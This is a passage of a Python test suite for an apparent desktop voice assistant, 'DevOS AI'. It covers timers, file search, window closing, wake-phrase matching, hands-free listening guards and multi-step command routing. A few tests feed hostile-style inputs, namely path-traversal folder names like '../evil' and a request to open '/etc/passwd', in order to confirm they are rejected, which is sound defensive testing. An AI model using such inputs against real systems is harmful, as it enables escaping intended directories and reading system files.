        ctx = self.make_ctx(ALL_TOOLS | {"kdialog", "systemd-run"}, env={"DISPLAY": ":0"})
        argv = tools.execute(tools.route("set a timer for 5 minutes", ctx).actions[0], ctx, dry_run=True).plan[0]
        self.assertIn("--setenv=DISPLAY=:0", argv)
        self.assertEqual(argv[-6:], ["/usr/bin/kdialog", "--title", "DevOS AI", "--passivepopup",
                                     "Timer done\nYour 5 minutes timer is done.", "60"])
        ctx = self.make_ctx(ALL_TOOLS | {"notify-send"})
        argv = tools.execute(tools.Action("reminder", {"seconds": 60, "message": "tea"}), ctx, dry_run=True).plan[0]
        self.assertEqual(argv[1:4], [tools.TOOLS_PY, "--notify-after", "60"])
        self.assertFalse(tools.execute(tools.Action("reminder", {"seconds": 10 ** 9}), ctx, dry_run=True).ok)

    def test_notify_after_helper(self):
        slept = []
        self.assertEqual(tools.notify_after(5, "T", "M", which=lambda n: None, sleep=slept.append), 1)
        self.assertEqual(slept, [5.0])

    def test_create_folder(self):
        res = self.run1("make a folder called Projects on the desktop", dry=False)
        self.assertTrue(os.path.isdir(os.path.join(self.home, "Desktop", "Projects")))
        self.assertIn("Created the folder **Projects**", res.text)
        res = self.run1("make a folder called Projects on the desktop", dry=False)
        self.assertIn("already exists", res.text)
        for bad in ("../evil", ".hidden", "a/b", ""):
            r = tools.execute(tools.Action("create_folder", {"name": bad}), self.ctx, dry_run=False)
            self.assertFalse(r.ok, bad)
        self.assertFalse(os.path.exists(os.path.join(self.home, "evil")))

    def test_open_path_search(self):
        for rel in ("Documents/report.pdf", "Documents/old/report.pdf", "Downloads/budget 2026.xlsx",
                    ".cache/report.pdf", "a/b/c/d/e/deep.pdf"):
            p = os.path.join(self.home, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            open(p, "w").close()
        res = self.run1("open the file budget")
        self.assertEqual(res.plan, [["xdg-open", os.path.join(self.home, "Downloads/budget 2026.xlsx")]])
        res = self.run1("open report.pdf")
        self.assertEqual(len(res.data["found"]), 2, "hidden folders are skipped")
        self.assertEqual(len(res.buttons), 2)
        self.assertEqual(res.buttons[0][1].name, "open_path")
        self.assertEqual(tools.find_files(self.home, "deep.pdf"), [], "depth is bounded")
        self.assertFalse(self.run1("open the file nothing-here.pdf").ok)
        out = tools.execute(tools.Action("open_path", {"path": "/etc/passwd"}), self.ctx, dry_run=True)
        self.assertFalse(out.ok)


class TestMediaAndClose(ToolCase):

    def test_media(self):
        self.assertEqual(self.run1("next song").plan, [["playerctl", "next"]])
        ctx = self.make_ctx(self.TOOLS - {"playerctl"})
        self.assertEqual(tools.execute(tools.Action("media", {"op": "pause"}), ctx, dry_run=True).plan,
                         [["xdotool", "key", "XF86AudioPlay"]])
        ctx = self.make_ctx(ALL_TOOLS)
        self.assertFalse(tools.execute(tools.Action("media", {"op": "next"}), ctx, dry_run=True).ok)
        res = self.run1("play music")
        self.assertEqual(res.plan, [["vlc", "--one-instance", os.path.join(self.home, "Music")]])

    def test_close_by_window_class(self):
        self.replies[("wmctrl", "-lx")] = (0, "0x04000007  0 google-chrome.Google-chrome  pc  Inbox - Chrome\n"
                                              "0x05000003  0 konsole.konsole  pc  ~ : bash\n"
                                              "0x04000099  0 google-chrome.Google-chrome  pc  News - Chrome\n")
        res = self.run1("close chrome", dry=False)
        self.assertTrue(res.ok)
        self.assertIn(["wmctrl", "-i", "-c", "0x04000007"], self.ran)
        self.assertIn(["wmctrl", "-i", "-c", "0x04000099"], self.ran)
        self.assertNotIn(["wmctrl", "-i", "-c", "0x05000003"], self.ran)
        self.assertEqual(self.killed, [])

    def test_close_falls_back_to_sigterm_for_own_processes_only(self):
        import signal as _signal
        for pid, uid, cmd in ((4242, 1000, b"kcalc\0"), (4243, 0, b"kcalc\0"), (4244, 1000, b"konsole\0")):
            d = os.path.join(self.root, "proc", str(pid))
            os.makedirs(d)
            with open(os.path.join(d, "status"), "w") as fh:
                fh.write(f"Name:\tx\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
            with open(os.path.join(d, "cmdline"), "wb") as fh:
                fh.write(cmd)
        res = self.run1("close the calculator", dry=False)
        self.assertTrue(res.ok)
        self.assertEqual(self.killed, [(4242, _signal.SIGTERM)])

    def test_never_closes_the_desktop(self):
        res = tools.execute(tools.Action("close_app", {"name": "plasma"}), self.ctx, dry_run=False)
        self.assertFalse(res.ok)
        self.assertEqual(self.killed, [])


class TestWakePhrase(unittest.TestCase):

    def test_positives(self):
        cases = {
            "Hey DevOS": "", "hey devos, open chrome": "open chrome", "Hi DevOS open notepad": "open notepad",
            "OK DevOS. Take a screenshot.": "Take a screenshot.", "Hey Dev OS, volume up": "volume up",
            "hey de vos what time is it": "what time is it", "Hey, Devo's, open files": "open files",
            "hey davos play music": "play music", "Hey devops, open chrome": "open chrome",
            "Hey the vos lock the screen": "lock the screen", "okay devoss": "", "hey devo s mute": "mute",
            "Hay devos open youtube": "open youtube", "DevOS, open settings": "open settings",
            "hey devoz open notepad": "open notepad",
        }
        for text, rest in cases.items():
            with self.subTest(text=text):
                self.assertEqual(voice.match_wake(text), (True, rest))

    def test_negatives(self):
        for text in ("hey there devon", "devops pipeline", "hey devon open chrome", "they've got it",
                     "open chrome", "heaven knows", "hey kevin", "the devos team is great", "", "hey",
                     "hello there", "I love devops"):
            with self.subTest(text=text):
                self.assertFalse(voice.match_wake(text)[0])


class FakeClock:
    def __init__(self):
        self.t = 100.0

    def __call__(self):
        return self.t


class TestHandsFreeFlow(unittest.TestCase):

    def setUp(self):
        self.ctx = tools.ToolContext(root="/nonexistent", home=tempfile.gettempdir(), which=fake_which(),
                                     launcher=lambda a: True, now=lambda: NOW)
        self.clock = FakeClock()
        self.said = []
        self.runner = listen.CommandRunner(self.ctx, dry_run=True)

    def hf(self, guard=None):
        return listen.HandsFree(lambda pcm: self.said.pop(0), self.runner, guard=guard, clock=self.clock)

    def kinds(self, events):
        return [k for k, _ in events]

    def test_wake_and_command_in_one_breath(self):
        self.said = ["Hey DevOS, open notepad and write buy milk"]
        ev = self.hf().on_segment(b"pcm")
        self.assertEqual(self.kinds(ev), ["wake", "heard", "result"])
        out = ev[-1][1]
        self.assertEqual(out.actions, ["write_note"])
        self.assertEqual(out.data[0]["content"], "buy milk")

    def test_wake_then_follow_up_within_6_seconds(self):
        h = self.hf()
        self.said = ["Hey DevOS.", "take a screenshot"]
        self.assertEqual(self.kinds(h.on_segment(b"1")), ["wake"])
        self.assertTrue(h.armed)
        self.clock.t += 4.0
        ev = h.on_segment(b"2")
        self.assertEqual(self.kinds(ev), ["heard", "result"])
        self.assertEqual(ev[-1][1].actions, ["screenshot"])
        self.assertFalse(h.armed)

    def test_timeout_after_6_seconds(self):
        h = self.hf()
        self.said = ["hey devos", "open chrome"]
        h.on_segment(b"1")
        self.clock.t += 6.5
        self.assertEqual(self.kinds(h.tick()), ["timeout"])
        self.assertEqual(self.kinds(h.on_segment(b"2")), ["ignored"], "no wake phrase: nothing happens")

    def test_other_speech_is_ignored_and_guard_skips(self):
        self.said = ["devops pipeline is broken again"]
        self.assertEqual(self.kinds(self.hf().on_segment(b"x")), ["ignored"])
        self.said = ["hey devos open chrome"]
        ev = self.hf(guard=lambda: "cpu").on_segment(b"x")
        self.assertEqual(ev, [("skipped", "cpu")])
        self.assertEqual(self.said, ["hey devos open chrome"], "nothing was transcribed")

    def test_destructive_needs_a_click(self):
        self.said = ["hey devos shut down the computer"]
        out = self.hf().on_segment(b"x")[-1][1]
        self.assertEqual(out.plans, [])
        self.assertIn("won't", out.text)
        runner = listen.CommandRunner(self.ctx, dry_run=True, confirm=lambda a: True)
        out = runner.run("shut down the computer")
        self.assertEqual(out.plans, [["systemctl", "poweroff"]])

    def test_unknown_offers_the_window(self):
        out = self.runner.run("tell me a joke")
        self.assertFalse(out.handled)
        self.assertTrue(out.open_in_app)
        self.assertEqual(listen.open_in_app_command("tell me a joke")[-2:], ["--ask", "tell me a joke"])

    def test_segments_from_fake_audio(self):
        frame = voice.SEG_FRAME_BYTES
        quiet = voice.synth_tone(1.0, 30)
        speech = voice.synth_tone(1.2, 9000)
        blip = voice.synth_tone(0.15, 9000)
        pcm = quiet + speech + quiet + blip + quiet + voice.synth_tone(9.0, 9000) + quiet
        segs = list(listen.segments_from_frames(voice.frames(pcm, frame)))
        self.assertEqual(len(segs), 3, "one sentence; the blip dropped; 9 s of noise cut at 6 s (+ its tail)")
        self.assertAlmostEqual(len(segs[0]) / (2 * voice.RATE), 1.2 + 0.3 + 0.6, delta=0.12)
        self.assertLessEqual(max(len(s) for s in segs) / (2 * voice.RATE), voice.SEG_MAX_S + 0.05)
        # the whole chain: fake audio -> segments -> fake speech-to-text -> router (dry run)
        h = self.hf()
        self.said = ["Hey DevOS, set a timer for 5 minutes", "random noise", "more noise"]
        events = [e for s in segs for e in h.on_segment(s)]
        self.assertEqual(self.kinds(events), ["wake", "heard", "result", "ignored", "ignored"])
        self.assertEqual(events[2][1].actions, ["reminder"])


class TestListenHelpers(unittest.TestCase):

    def setUp(self):
        self.d = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.d, ignore_errors=True)

    def test_config_and_live_session(self):
        cfg = os.path.join(self.d, "devos", "assistant.json")
        self.assertFalse(listen.hands_free_enabled(cfg), "off by default")
        listen.save_config(cfg, hands_free=True)
        listen.save_config(cfg, paused=True)
        self.assertEqual(listen.load_config(cfg), {"hands_free": True, "paused": True})
        p = os.path.join(self.d, "cmdline")
        with open(p, "w") as fh:
            fh.write("BOOT_IMAGE=/casper/vmlinuz boot=casper quiet splash\n")
        self.assertTrue(listen.live_session(p))
        with open(p, "w") as fh:
            fh.write("BOOT_IMAGE=/vmlinuz root=UUID=x quiet\n")
        self.assertFalse(listen.live_session(p))
        self.assertEqual(listen.run_daemon(config_path=os.path.join(self.d, "none.json")), 0,
                         "the autostart entry exits at once while hands-free is off")

    def test_budget_and_guards(self):
        self.assertEqual(listen.transcribe_threads(16), 4)
        self.assertEqual(listen.transcribe_threads(4), 2)
        self.assertEqual(listen.transcribe_threads(1), 1)
        stat = os.path.join(self.d, "stat")
        with open(stat, "w") as fh:
            fh.write("cpu  100 0 100 800 0 0 0 0 0 0\n")
        meter = listen.CpuMeter(stat)
        with open(stat, "w") as fh:
            fh.write("cpu  1000 0 100 810 0 0 0 0 0 0\n")
        self.assertGreater(meter.percent(), 85)
        root = os.path.join(self.d, "root")
        bat = os.path.join(root, "sys/class/power_supply/BAT0")
        os.makedirs(bat)
        for name, val in (("type", "Battery"), ("capacity", "9"), ("status", "Discharging")):
            with open(os.path.join(bat, name), "w") as fh:
                fh.write(val + "\n")
        ctx = tools.ToolContext(root=root)
        self.assertTrue(listen.battery_low(ctx))
        idle = types.SimpleNamespace(percent=lambda: 10.0)
        self.assertEqual(listen.Guard(ctx, cpu=idle).reason(), "battery")
        nobat = tools.ToolContext(root="/nonexistent")
        self.assertEqual(listen.Guard(nobat, cpu=idle, mic_check=lambda: True).reason(), "mic")
        self.assertEqual(listen.Guard(nobat, cpu=types.SimpleNamespace(percent=lambda: 95.0)).reason(), "cpu")
        self.assertEqual(listen.Guard(nobat, cpu=idle, paused=lambda: True).reason(), "paused")
        self.assertEqual(listen.Guard(nobat, cpu=idle, mic_check=lambda: False).reason(), "")

    def test_mic_in_use(self):
        text = ('Source Output #41\n\tDriver: PipeWire\n\tProperties:\n\t\tapplication.name = "parecord"\n'
                '\t\tapplication.process.id = "500"\n\t\tapplication.process.binary = "parecord"\n'
                'Source Output #42\n\tProperties:\n\t\tapplication.name = "Zoom"\n'
                '\t\tapplication.process.id = "900"\n\t\tapplication.process.binary = "zoom"\n')
        self.assertEqual([s["pid"] for s in listen.parse_source_outputs(text)], ["500", "900"])
        self.assertTrue(listen.mic_used_by_others(text, [500]))
        self.assertFalse(listen.mic_used_by_others(text.split("Source Output #42")[0], [500]))

    def test_plain_text(self):
        self.assertEqual(listen.plain_text("Saved to **Documents/Notes/a.txt** and opened it in Notepad."),
                         "Saved to Documents/Notes/a.txt and opened it in Notepad.")
        self.assertEqual(listen.plain_text("**This PC**\n- **Processor:** i5\n- **RAM:** 8 GB"),
                         "This PC: Processor: i5; RAM: 8 GB")


BUILD = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../build/includes.chroot"))


class TestVoiceDesktopFiles(unittest.TestCase):

    def read(self, rel):
        with open(os.path.join(BUILD, rel), encoding="utf-8") as fh:
            return fh.read()

    def test_hotkey_entry(self):
        e = tools.parse_desktop_text(self.read("usr/share/applications/devos-voice.desktop"))
        self.assertEqual(e["Exec"], "/usr/bin/python3 /usr/local/share/devos/components/assistant/listen.py --once")
        self.assertEqual(e["Name"], "Voice Command")
        self.assertEqual(e["NoDisplay"], "false")
        self.assertIn("Meta+H", e["X-KDE-Shortcuts"])

    def test_global_shortcut_appended(self):
        text = self.read("etc/xdg/kglobalshortcutsrc")
        self.assertIn("[services][devos-voice.desktop]\n_launch=Meta+H\\tCtrl+Alt+Space", text)
        self.assertIn("[kwin]", text, "existing shortcuts are kept")
        # Plasma 5.27 reads the group named after the .desktop file.
        self.assertIn("[devos-voice.desktop]\n_k_friendly_name=Voice Command\n_launch=Meta+H", text)
        self.assertEqual(text.count("[devos-voice.desktop]"), 2)

    def test_autostart(self):
        e = tools.parse_desktop_text(self.read("etc/xdg/autostart/devos-voice.desktop"))
        self.assertTrue(e["Exec"].endswith("assistant/listen.py --daemon"))
        self.assertEqual(e["NoDisplay"], "true")

    def test_line_endings(self):
        for rel in ("usr/share/applications/devos-voice.desktop", "etc/xdg/autostart/devos-voice.desktop",
                    "etc/xdg/kglobalshortcutsrc"):
            with open(os.path.join(BUILD, rel), "rb") as fh:
                self.assertNotIn(b"\r", fh.read(), rel)


class TestNewModulesShowNoEngineNames(unittest.TestCase):

    def test_scan(self):
        for mod in ("listen", "overlay"):
            path = os.path.join(SYS_PATH_ASSISTANT, mod + ".py")
            strings = user_visible_strings(path)
            self.assertTrue(strings, mod)
            for s in strings:
                low = s.lower()
                for bad in BANNED + ("xdotool", "wmctrl", "playerctl"):
                    self.assertNotIn(bad, low, f"{mod}.py shows {bad!r} in: {s[:120]!r}")
        for m in (tools.TYPING_X11_ONLY_TEXT, tools.TYPING_MISSING_TEXT, tools.CLICK_TO_TYPE_TEXT,
                  listen.NOT_UNDERSTOOD_TEXT, listen.HANDS_FREE_LABEL, listen.NOTHING_HEARD_TEXT,
                  listen.OPEN_IN_APP_LABEL, tools.HELP_TEXT):
            for bad in BANNED + ("xdotool", "wmctrl", "playerctl", "x11"):
                self.assertNotIn(bad, m.lower(), m)


class TestRealVoiceShapes(unittest.TestCase):
    """Transcripts as the real speech model wrote them in the pipeline check."""

    def test_transcripts_from_the_real_model(self):
        runner = listen.CommandRunner(tools.ToolContext(root="/nonexistent", home=tempfile.gettempdir(),
                                                        which=fake_which(), now=lambda: NOW), dry_run=True)
        hf = listen.HandsFree(lambda pcm: pcm.decode(), runner)
        ev = hf.on_segment(b"Hey Devose open Notepad and write buy milk.")
        self.assertEqual(ev[1], ("heard", "open notepad and write buy milk"))
        self.assertEqual(ev[2][1].data[0]["content"], "buy milk")
        self.assertEqual(hf.on_segment(b"Hey Devose!"), [("wake", "")])
        self.assertEqual(hf.on_segment(b"Take a screenshot.")[-1][1].actions, ["screenshot"])
        self.assertEqual(voice.fix_transcript("Wait..."), "Wait...")


class TestNoSpeakerLabels(unittest.TestCase):
    """The tiny model sometimes starts with 'me:'; it looked like it spoke as the user."""

    def test_leading_label_removed(self):
        import engine as _engine
        self.assertEqual(_engine.scrub("me: How can I assist you today?"), "How can I assist you today?")
        self.assertEqual(_engine.scrub("DevOS AI: Hello"), "Hello")
        self.assertEqual(_engine.scrub("**Assistant:** Sure."), "Sure.")
        # Only a leading label; normal text with a colon stays.
        self.assertEqual(_engine.scrub("Note: you can say me: later"), "Note: you can say me: later")


class TestHistoryHasNoLabels(unittest.TestCase):
    def test_saved_me_labels_are_not_fed_back(self):
        import engine as _engine
        h = _engine.History.__new__(_engine.History) if hasattr(_engine, "History") else None
        if h is None:
            self.skipTest("no History class")
        h.messages = [{"role": "user", "text": "hi"}, {"role": "assistant", "text": "me: How can I help?"}]
        self.assertEqual(h.for_model()[1]["content"], "How can I help?")


class TestVoiceAvailability(unittest.TestCase):
    """The window dims the mic and the Hands-free switch when voice can't work (no voice pack or no
    microphone); the check is cheap and cached."""

    def test_pactl_sources(self):
        only_monitors = ("0\talsa_output.pci-0000_00_1f.3.analog-stereo.monitor\tmodule-alsa-card.c\ts16le 2ch "
                         "44100Hz\tSUSPENDED\n")
        self.assertFalse(voice.parse_pactl_sources(only_monitors))
        self.assertFalse(voice.parse_pactl_sources(""))
        with_mic = only_monitors + ("1\talsa_input.pci-0000_00_1f.3.analog-stereo\tmodule-alsa-card.c\ts16le 2ch "
                                    "44100Hz\tSUSPENDED\n")
        self.assertTrue(voice.parse_pactl_sources(with_mic))

    def test_arecord_cards(self):
        self.assertFalse(voice.parse_arecord_cards("**** List of CAPTURE Hardware Devices ****\n"))
        self.assertTrue(voice.parse_arecord_cards(
            "**** List of CAPTURE Hardware Devices ****\ncard 0: PCH [HDA Intel PCH], device 0: ALC3246 Analog\n"))

    def test_has_microphone_uses_sound_server_then_cards(self):
        calls = []

        def run(cmd):
            calls.append(cmd[0])
            return {"pactl": "0\tx.monitor\tm\ts\tIDLE\n", "arecord": "card 0: X\n"}[cmd[0]]
        self.assertFalse(voice.has_microphone(fake_which({"pactl", "arecord"}), run))
        self.assertEqual(calls, ["pactl"])
        # sound server not answering -> the card list decides
        self.assertTrue(voice.has_microphone(fake_which({"pactl", "arecord"}),
                                             lambda c: None if c[0] == "pactl" else "card 1: USB\n"))
        self.assertFalse(voice.has_microphone(fake_which(set()), run), "nothing could record")

    def test_check_is_cached(self):
        n = {"ready": 0, "mic": 0}
        t = [100.0]
        mic = [False]

        def ready():
            n["ready"] += 1
            return True

        def has_mic():
            n["mic"] += 1
            return mic[0]
        chk = voice.VoiceCheck(ready=ready, mic=has_mic, clock=lambda: t[0], ttl=30)
        self.assertEqual(chk.status(), (False, voice.NO_MIC_TEXT))
        mic[0] = True
        t[0] += 10
        self.assertFalse(chk.usable(), "cached for 30 s")
        self.assertEqual(n, {"ready": 1, "mic": 1})
        t[0] += 25
        self.assertTrue(chk.usable())
        self.assertTrue(chk.usable(force=False))
        self.assertFalse(voice.VoiceCheck(ready=lambda: False, mic=has_mic, clock=lambda: 0).usable())
        for m in (voice.VOICE_UNAVAILABLE_TEXT, voice.NO_MIC_TEXT):
            for bad in BANNED:
                self.assertNotIn(bad, m.lower())


def _qt_available():
    try:
        import PyQt5.QtWidgets  # noqa: F401
        return True
    except Exception:
        return False


@unittest.skipUnless(_qt_available(), "needs PyQt5 (runs offscreen)")
class TestChatWindowLayout(unittest.TestCase):
    """Regression: wrapped messages used to leave hundreds of pixels of blank space under the last message
    (the scroll area sized its content by the labels' minimumSizeHint instead of heightForWidth), and the
    Hands-free switch / mic added a notice card to the chat on every click when voice wasn't available."""

    @classmethod
    def setUpClass(cls):
        os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
        from PyQt5 import QtWidgets
        import assistant
        cls.A = assistant
        cls.app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])

    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.win = self.A.AssistantWindow(store=engine.ChatStore(self.d).load())
        self.win._service_started = True     # never try to start the AI service from a test
        self.win.resize(880, 600)
        self.win.show()
        self.pump(100)

    def tearDown(self):
        self.win.status_timer.stop()
        self.win.hide()
        self.pump(50)
        self.win.deleteLater()
        shutil.rmtree(self.d, ignore_errors=True)

    def pump(self, ms):
        from PyQt5 import QtCore
        loop = QtCore.QEventLoop()
        QtCore.QTimer.singleShot(ms, loop.quit)
        loop.exec_()

    def test_no_blank_space_under_last_message(self):
        from PyQt5 import QtCore
        w = self.win
        w.add_user("hi", save=False)
        for _ in range(5):
            w.add_bot(voice.VOICE_MISSING + " Hands-free can be turned on once voice commands work.", ok=False,
                      save=False, level="info")
        w.add_bot("A medium answer that wraps. " * 20, save=False)
        self.pump(500)
        w.scroll_to_bottom(False)
        self.pump(100)
        vp = w.scroll.viewport()
        last = w.rows[-1]
        bottom = last.mapTo(vp, QtCore.QPoint(0, last.height())).y()
        self.assertLessEqual(vp.height() - bottom, 60, "blank space below the last message")
        self.assertGreater(bottom, 0, "last message scrolled out of view")
        stretch = w.column.height() - sum(r.height() for r in w.rows)
        self.assertLessEqual(stretch, 2)

    def test_voice_unavailable_never_adds_chat_messages(self):
        w = self.win
        w._apply_voice(False, voice.VOICE_UNAVAILABLE_TEXT)
        n = len(w.rows)
        for _ in range(4):
            w.sidebar.hands_free.switch.click()
            w.mic_btn.click()
        self.pump(50)
        self.assertEqual(len(w.rows), n)
        self.assertFalse(w.sidebar.hands_free.switch.isChecked())
        self.assertFalse(w.sidebar.hands_free.hint.isHidden())
        self.assertTrue(w.toast.isVisible())


class TestMultiStepChaining(unittest.TestCase):

    def test_multi_step_search_and_navigate(self):
        prompt = "search in google imrandevbd then go to the 1st website then go to contact page of this website"
        res = tools.route(prompt)
        self.assertEqual(len(res.actions), 3)
        self.assertEqual(res.actions[0].name, "web_search")
        self.assertEqual(res.actions[0].args.get("query"), "imrandevbd")
        self.assertEqual(res.actions[1].name, "open_search_result")
        self.assertEqual(res.actions[1].args.get("rank"), 1)
        self.assertEqual(res.actions[1].args.get("query"), "imrandevbd")
        self.assertEqual(res.actions[2].name, "open_web_page")
        self.assertEqual(res.actions[2].args.get("page"), "contact")

    def test_multi_step_apps_and_screenshot(self):
        prompt = "open chrome then open terminal then take a screenshot"
        res = tools.route(prompt)
        self.assertEqual(len(res.actions), 3)
        self.assertEqual([a.name for a in res.actions], ["open_app", "open_app", "screenshot"])

    def test_multi_step_time_and_volume(self):
        prompt = "tell me the time then mute sound"
        res = tools.route(prompt)
        self.assertEqual(len(res.actions), 2)
        self.assertEqual([a.name for a in res.actions], ["time", "volume"])

    def test_execution_search_result_and_web_page(self):
        ctx = tools.ToolContext()
        a_search = tools.Action("web_search", {"engine": "google", "query": "imrandevbd",
                                               "url": "https://www.google.com/search?q=imrandevbd", "browser": "default"})
        res1 = tools.execute(a_search, ctx, dry_run=True)
        self.assertTrue(res1.ok)
        self.assertIn("Searching Google for **imrandevbd**", res1.text)

        a_result = tools.Action("open_search_result", {"query": "imrandevbd", "rank": 1, "browser": "default"})
        res2 = tools.execute(a_result, ctx, dry_run=True)
        self.assertTrue(res2.ok)
        self.assertIn("Opening the 1st website (**imrandev.bd**)", res2.text)

        a_page = tools.Action("open_web_page", {"page": "contact", "website": "https://imrandev.bd", "browser": "default"})
        res3 = tools.execute(a_page, ctx, dry_run=True)
        self.assertTrue(res3.ok)
        self.assertIn("Opening the contact page (**imrandev.bd/contact**)", res3.text)

    def test_fast_chat_reply_instant_speed(self):
        ctx = tools.ToolContext(root="/nonexistent", which=lambda n: None, launcher=lambda a: True)
        a = engine.Assistant(ctx=ctx)
        # Thanks
        r_thanks = a.chat("thanks")
        self.assertTrue(r_thanks.ok)
        self.assertIn("welcome", r_thanks.text.lower())
        r_dhonno = a.chat("ধন্যবাদ")
        self.assertTrue(r_dhonno.ok)
        self.assertIn("স্বাগতম", r_dhonno.text)
        # Ack
        r_ok = a.chat("ok")
        self.assertTrue(r_ok.ok)
        self.assertIn("Got it", r_ok.text)
        # Status
        r_status = a.chat("kemon acho")
        self.assertTrue(r_status.ok)
        self.assertIn("ভালো আছি", r_status.text)
        # Non-fast path goes to normal model
        self.assertIsNone(engine.fast_chat_reply("what is docker"))


